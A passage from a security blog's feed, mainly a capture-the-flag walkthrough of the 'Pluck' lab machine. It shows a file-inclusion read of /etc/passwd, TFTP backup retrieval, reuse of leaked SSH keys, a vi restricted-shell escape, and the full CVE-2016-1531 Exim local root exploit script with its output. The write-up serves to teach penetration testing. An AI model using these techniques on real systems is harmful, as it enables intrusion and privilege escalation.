</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# netmask -s 192.168.217.0/24
</span><span class='line'>  192.168.217.0/255.255.255.0  </span></code></pre></td></tr></table></div></figure>


<ul>
<li>CIDR notation</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# netmask -c google.com
</span><span class='line'>  216.58.210.14/32
</span><span class='line'>2a00:1450:4001:81d::200e/128</span></code></pre></td></tr></table></div></figure>


<ul>
<li>Cisco-style notation</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# netmask -i google.com
</span><span class='line'>  216.58.210.14 0.0.0.0        
</span><span class='line'>2a00:1450:4001:81d::200e ::   </span></code></pre></td></tr></table></div></figure>


<ul>
<li>IP ranges</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# netmask -r 192.168.217.0/24
</span><span class='line'>  192.168.217.0-192.168.217.255 (256)</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>&lt; Your ignorance cramps my conversation. &gt;
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Got Pluck?]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/06/got-pluck/"/>
    <updated>2017-07-06T06:28:41-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/06/got-pluck</id>
    <content type="html"><![CDATA[<p>New day, new machine to hack! Today&rsquo;s target is called Pluck.</p>

<!-- more -->


<h2>Recon</h2>

<p>Nmap results:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE VERSION
</span><span class='line'>22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   2048 e8:87:ba:3e:d7:43:23:bf:4a:6b:9d:ae:63:14:ea:71 (RSA)
</span><span class='line'>|_  256 8f:8c:ac:8d:e8:cc:f9:0e:89:f7:5d:a0:6c:28:56:fd (ECDSA)
</span><span class='line'>80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
</span><span class='line'>|_http-server-header: Apache/2.4.18 (Ubuntu)
</span><span class='line'>|_http-title: Pluck
</span><span class='line'>3306/tcp open  mysql   MySQL (unauthorized)
</span><span class='line'>5355/tcp open  llmnr?</span></code></pre></td></tr></table></div></figure>


<p>First order of business, the web server:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/pluck/pluck.png" title="pluck" alt="pluck"></p>

<p>I ran Nikto on it and it revealed a couple of vulnerabilities:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+ Server: Apache/2.4.18 (Ubuntu)
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
</span><span class='line'>+ No CGI Directories found (use '-C all' to force check all possible dirs)
</span><span class='line'>+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
</span><span class='line'>+ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)
</span><span class='line'>+ OSVDB-29786: /admin.php?en_log_id=0&action=config: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
</span><span class='line'>+ OSVDB-29786: /admin.php?en_log_id=0&action=users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
</span><span class='line'>+ OSVDB-3092: /admin.php: This might be interesting...
</span><span class='line'>+ OSVDB-3268: /images/: Directory indexing found.
</span><span class='line'>+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80 
</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
</span><span class='line'>+ 7535 requests: 0 error(s) and 12 item(s) reported on remote host
</span><span class='line'>+ End Time:           2017-07-06 09:41:42 (GMT-4) (22 seconds)</span></code></pre></td></tr></table></div></figure>


<p>First, I went to the admin page and it seems vulnerable to SQL injection:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/pluck/admin.png" title="admin" alt="admin sqli"></p>

<p>I fired up sqlmap but I couldn&rsquo;t get anything out of the database. Maybe it was a false lead. Next I looked at the LFI vulnerability that Nikto detected and took a peak at <em>/etc/passwd</em>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span><span class='line'>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span><span class='line'>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span><span class='line'>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span><span class='line'>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span><span class='line'>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span><span class='line'>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span><span class='line'>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span><span class='line'>systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
</span><span class='line'>systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
</span><span class='line'>systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
</span><span class='line'>systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
</span><span class='line'>syslog:x:104:108::/home/syslog:/bin/false
</span><span class='line'>_apt:x:105:65534::/nonexistent:/bin/false
</span><span class='line'>messagebus:x:106:109::/var/run/dbus:/bin/false
</span><span class='line'>mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
</span><span class='line'>lxd:x:108:65534::/var/lib/lxd/:/bin/false
</span><span class='line'>uuidd:x:109:114::/run/uuidd:/bin/false
</span><span class='line'>dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
</span><span class='line'>sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>pollinate:x:112:1::/var/cache/pollinate:/bin/false
</span><span class='line'>bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
</span><span class='line'>Debian-exim:x:113:119::/var/spool/exim4:/bin/false
</span><span class='line'>peter:x:1001:1001:,,,:/home/peter:/bin/bash
</span><span class='line'>paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu
</span><span class='line'>backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh</span></code></pre></td></tr></table></div></figure>


<p>The last entry is interesting. I used the LFI to look at the script:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>########################
</span><span class='line'># Server Backup script #
</span><span class='line'>########################
</span><span class='line'>
</span><span class='line'>#Backup directories in /backups so we can get it via tftp
</span><span class='line'>
</span><span class='line'>echo "Backing up data"
</span><span class='line'>tar -cf /backups/backup.tar /home /var/www/html &gt; /dev/null 2& &gt; /dev/null
</span><span class='line'>echo "Backup complete"</span></code></pre></td></tr></table></div></figure>


<p>A TFTP reference, and I didn&rsquo;t scan for UDP ports. I went back to Nmap real quick:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -T4 -sU -p69 192.168.217.147
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-06 09:59 EDT
</span><span class='line'>Nmap scan report for 192.168.217.147
</span><span class='line'>Host is up (0.00016s latency).
</span><span class='line'>PORT   STATE         SERVICE
</span><span class='line'>69/udp open|filtered tftp</span></code></pre></td></tr></table></div></figure>


<p>I got the archive via T<a href="FTP:">FTP:</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tftp 192.168.217.147
</span><span class='line'>tftp&gt; get /backups/backup.tar
</span><span class='line'>Received 1824718 bytes in 1.4 seconds</span></code></pre></td></tr></table></div></figure>


<p>Extracted it to find some home directory contents, besides the source for the website:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tar -xvf backup.tar 
</span><span class='line'>home/
</span><span class='line'>home/bob/
</span><span class='line'>home/bob/.bashrc
</span><span class='line'>home/bob/.sudo_as_admin_successful
</span><span class='line'>home/bob/.profile
</span><span class='line'>home/bob/.bash_logout
</span><span class='line'>home/paul/
</span><span class='line'>home/paul/keys/
</span><span class='line'>home/paul/keys/id_key3.pub
</span><span class='line'>home/paul/keys/id_key2.pub
</span><span class='line'>home/paul/keys/id_key2
</span><span class='line'>home/paul/keys/id_key4.pub
</span><span class='line'>home/paul/keys/id_key5.pub
</span><span class='line'>home/paul/keys/id_key6
</span><span class='line'>home/paul/keys/id_key1
</span><span class='line'>home/paul/keys/id_key5
</span><span class='line'>home/paul/keys/id_key1.pub
</span><span class='line'>home/paul/keys/id_key6.pub
</span><span class='line'>home/paul/keys/id_key4
</span><span class='line'>home/paul/keys/id_key3
</span><span class='line'>home/paul/.bashrc
</span><span class='line'>home/paul/.profile
</span><span class='line'>home/paul/.bash_logout
</span><span class='line'>home/peter/
</span><span class='line'>home/peter/.bashrc
</span><span class='line'>home/peter/.profile
</span><span class='line'>home/peter/.bash_logout
</span><span class='line'>var/www/html/
</span><span class='line'>var/www/html/fonts/
</span><span class='line'>var/www/html/fonts/glyphicons-halflings-regular.svg
</span><span class='line'>var/www/html/fonts/glyphicons-halflings-regular.woff2
</span><span class='line'>var/www/html/fonts/glyphicons-halflings-regular.ttf
</span><span class='line'>var/www/html/fonts/glyphicons-halflings-regular.woff
</span><span class='line'>var/www/html/fonts/glyphicons-halflings-regular.eot
</span><span class='line'>var/www/html/about.php
</span><span class='line'>var/www/html/index.php
</span><span class='line'>var/www/html/footer.php
</span><span class='line'>var/www/html/css/
</span><span class='line'>var/www/html/css/bootstrap.css.map
</span><span class='line'>var/www/html/css/bootstrap.min.css.map
</span><span class='line'>var/www/html/css/bootstrap-theme.css
</span><span class='line'>var/www/html/css/bootstrap-theme.min.css
</span><span class='line'>var/www/html/css/bootstrap.min.css
</span><span class='line'>var/www/html/css/bootstrap-theme.min.css.map
</span><span class='line'>var/www/html/css/bootstrap-theme.css.map
</span><span class='line'>var/www/html/css/bootstrap.css
</span><span class='line'>var/www/html/header.php
</span><span class='line'>var/www/html/admin.php
</span><span class='line'>var/www/html/js/
</span><span class='line'>var/www/html/js/jquery.min.js
</span><span class='line'>var/www/html/js/bootstrap.js
</span><span class='line'>var/www/html/js/npm.js
</span><span class='line'>var/www/html/js/bootstrap.min.js</span></code></pre></td></tr></table></div></figure>


<p>Bob&rsquo;s directory:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/home/bob# ls -la
</span><span class='line'>total 20
</span><span class='line'>drwxr-xr-x 2 1000 1000 4096 Jan 18 07:43 .
</span><span class='line'>drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
</span><span class='line'>-rw-r--r-- 1 1000 1000  220 Jan 18 00:39 .bash_logout
</span><span class='line'>-rw-r--r-- 1 1000 1000 3771 Jan 18 00:39 .bashrc
</span><span class='line'>-rw-r--r-- 1 1000 1000  655 Jan 18 00:39 .profile
</span><span class='line'>-rw-r--r-- 1 1000 1000    0 Jan 18 03:40 .sudo_as_admin_successful</span></code></pre></td></tr></table></div></figure>


<p>That sudo file was empty. On to paul:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/home/paul# ls -la
</span><span class='line'>total 24
</span><span class='line'>drwxr-xr-x 3 1002 1002 4096 Jan 18 13:13 .
</span><span class='line'>drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
</span><span class='line'>-rw-r--r-- 1 1002 1002  220 Jan 18 03:04 .bash_logout
</span><span class='line'>-rw-r--r-- 1 1002 1002 3771 Jan 18 03:04 .bashrc
</span><span class='line'>drwxrwxr-x 2 1002 1002 4096 Jan 18 13:09 keys
</span><span class='line'>-rw-r--r-- 1 1002 1002  655 Jan 18 03:04 .profile
</span><span class='line'>root@kali:~/home/paul# ls -la keys/
</span><span class='line'>total 56
</span><span class='line'>drwxrwxr-x 2 1002 1002 4096 Jan 18 13:09 .
</span><span class='line'>drwxr-xr-x 3 1002 1002 4096 Jan 18 13:13 ..
</span><span class='line'>-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key1
</span><span class='line'>-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key1.pub
</span><span class='line'>-rwxrwxr-x 1 1002 1002  672 Jan 18 13:08 id_key2
</span><span class='line'>-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key2.pub
</span><span class='line'>-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key3
</span><span class='line'>-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key3.pub
</span><span class='line'>-rwxrwxr-x 1 1002 1002 1679 Jan 18 13:09 id_key4
</span><span class='line'>-rwxrwxr-x 1 1002 1002  392 Jan 18 13:09 id_key4.pub
</span><span class='line'>-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key5
</span><span class='line'>-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key5.pub
</span><span class='line'>-rwxrwxr-x 1 1002 1002 1675 Jan 18 13:09 id_key6
</span><span class='line'>-rwxrwxr-x 1 1002 1002  392 Jan 18 13:09 id_key6.pub</span></code></pre></td></tr></table></div></figure>


<p>It looks like paul didn&rsquo;t put much effort into securing his SSH keys. Lastly, peter:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/home/peter# ls -la
</span><span class='line'>total 20
</span><span class='line'>drwxr-xr-x 2 1001 1001 4096 Jan 18 03:04 .
</span><span class='line'>drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
</span><span class='line'>-rw-r--r-- 1 1001 1001  220 Jan 18 03:04 .bash_logout
</span><span class='line'>-rw-r--r-- 1 1001 1001 3771 Jan 18 03:04 .bashrc
</span><span class='line'>-rw-r--r-- 1 1001 1001  655 Jan 18 03:04 .profile</span></code></pre></td></tr></table></div></figure>


<h2>Privilege escalation</h2>

<p>Back to paul, and trying those SSH keys. Tried each, the 4th one worked, but it dropped me to this menu:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/pluck/pdmenu.png" title="pdmenu" alt="pdmenu"></p>

<p>So, what is pdmenu?</p>

<blockquote><p>Pdmenu is a full screen menuing system for Unix. It is designed to be easy to use, and is suitable as a login shell
for inexperienced users, or it can just be ran at the command line as a handy menu.</p></blockquote>

<p>Not much I can do with this, however, the option to edit a file launches vi! I remembered another challenge where vi helped me escape shell restrictions, and found a <a href="https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells">SANS article</a> about this exact topic. To get a proper shell, I typed the following in vi&rsquo;s command mode:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>:set shell=/bin/bash
</span><span class='line'>:!bash</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>That dropped me into paul&rsquo;s shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>paul@pluck:~$ id
</span><span class='line'>uid=1002(paul) gid=1002(paul) groups=1002(paul)</span></code></pre></td></tr></table></div></figure>


<p>SUID enumeration led me to the next step:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>paul@pluck:~$ find / -perm -4000 2&gt;/dev/null
</span><span class='line'>/usr/exim/bin/exim-4.84-7
</span><span class='line'>/usr/bin/passwd
</span><span class='line'>/usr/bin/at
</span><span class='line'>/usr/bin/newgrp
</span><span class='line'>/usr/bin/pkexec
</span><span class='line'>/usr/bin/sudo
</span><span class='line'>/usr/bin/traceroute6.iputils
</span><span class='line'>/usr/bin/newuidmap
</span><span class='line'>/usr/bin/chfn
</span><span class='line'>/usr/bin/gpasswd
</span><span class='line'>/usr/bin/newgidmap
</span><span class='line'>/usr/bin/chsh
</span><span class='line'>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span><span class='line'>/usr/lib/policykit-1/polkit-agent-helper-1
</span><span class='line'>/usr/lib/s-nail/s-nail-privsep
</span><span class='line'>/usr/lib/openssh/ssh-keysign
</span><span class='line'>/usr/lib/eject/dmcrypt-get-device
</span><span class='line'>/bin/su
</span><span class='line'>/bin/umount
</span><span class='line'>/bin/mount
</span><span class='line'>/bin/fusermount
</span><span class='line'>/bin/ping
</span><span class='line'>/bin/ntfs-3g</span></code></pre></td></tr></table></div></figure>


<p>Exim is a MTA similar to sendmail. Googling for an exploit yielded a <a href="https://www.exploit-db.com/exploits/39535/">local root exploit</a>. I used vi to create a shell script with the exploit code, changed it to executable and ran it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>paul@pluck:~$ vi rootme.sh 
</span><span class='line'>paul@pluck:~$ cat rootme.sh 
</span><span class='line'>echo [ CVE-2016-1531 local root exploit
</span><span class='line'>cat &gt; /tmp/root.pm &lt;&lt; EOF
</span><span class='line'>package root;
</span><span class='line'>use strict;
</span><span class='line'>use warnings;
</span><span class='line'> 
</span><span class='line'>system("/bin/sh");
</span><span class='line'>EOF
</span><span class='line'>PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
</span><span class='line'>
</span><span class='line'>paul@pluck:~$ ./rootme.sh 
</span><span class='line'>[ CVE-2016-1531 local root exploit
</span><span class='line'># whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>The flag is mine!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># cat /root/flag.txt
</span><span class='line'>
</span><span class='line'>Congratulations you found the flag
</span><span class='line'>
</span><span class='line'>---------------------------------------
</span><span class='line'>
</span><span class='line'>######   ((((((((((((((((((((((((((((((
</span><span class='line'>#########   (((((((((((((((((((((((((((
</span><span class='line'>,,##########   ((((((((((((((((((((((((
</span><span class='line'>@@,,,##########   (((((((((((((((((((((
</span><span class='line'>@@@@@,,,##########                     
</span><span class='line'>@@@@@@@@,,,############################
</span><span class='line'>@@@@@@@@@@@,,,#########################
</span><span class='line'>@@@@@@@@@,,,###########################
</span><span class='line'>@@@@@@,,,##########                    
</span><span class='line'>@@@,,,##########   &&&&&&&&&&&&&&&&&&&&
</span><span class='line'>,,,##########   &&&&&&&&&&&&&&&&&&&&&&&
</span><span class='line'>##########   &&&&&&&&&&&&&&&&&&&&&&&&&&
</span><span class='line'>#######   &&&&&&&&&&&&&&&&&&&&&&&&&&&&&</span></code></pre></td></tr></table></div></figure>


<p>Interesting twist on this VM with the pdbmenu escape!</p>

<p><strong>Learn more</strong></p>

<ul>
<li><a href="https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells">escape restricted Linux shells</a></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
</span><span class='line'>/ Q: How many Zen masters does it take to \
</span><span class='line'>| screw in a light bulb? A: None. The     |
</span><span class='line'>| Universe spins the bulb, and the Zen    |
</span><span class='line'>| master stays out                        |
</span><span class='line'>|                                         |
</span><span class='line'>\ of the way.                             /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[urlcrazy - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/05/urlcrazy-kali-linux-tools/"/>
    <updated>2017-07-05T06:44:07-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/05/urlcrazy-kali-linux-tools</id>
